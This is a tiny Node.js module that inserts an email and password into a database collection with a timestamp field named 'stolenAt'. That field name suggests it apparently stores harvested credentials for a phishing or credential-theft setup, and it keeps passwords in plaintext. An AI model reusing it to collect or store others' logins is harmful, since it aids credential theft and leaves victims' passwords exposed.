module.exports = {
  insert: async (collection, { email, password }) => {
    return collection.insertOne({
      email,
      password,
      stolenAt: new Date()
    });
  }
};